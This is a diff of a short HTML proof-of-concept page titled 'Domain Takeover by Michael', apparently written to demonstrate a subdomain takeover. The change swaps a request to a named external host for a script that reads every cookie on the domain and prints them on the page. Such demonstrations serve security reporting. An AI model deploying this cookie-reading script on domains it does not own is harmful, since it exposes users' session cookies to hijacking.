@@ -2,14 +2,18 @@
 <title>TAKEOVER</title>
 <head></head>
 <body>
-  <center>Takeover by Michael</center><br />
+  <center>Domain Takeover by Michael</center><br />
   <h1 id=list>-</h1>
   <script>
-    x1 = new XMLHttpRequest;
-    x1.open( 'GET','http://oprichtingen.firm24.com/info.php', false );
-    x1.send();
-    r = x1.status;
-    document.getElementById('list').textContent = r;
+    function listCookies() {
+        var theCookies = document.cookie.split(';');
+        var aString = '';
+        for (var i = 1 ; i <= theCookies.length; i++) {
+            aString += i + ' ' + theCookies[i-1] + "\n";
+        }
+        return aString;
+    }
+    document.getElementById('list').textContent = listCookies();
   </script>
 </body>
 </html>
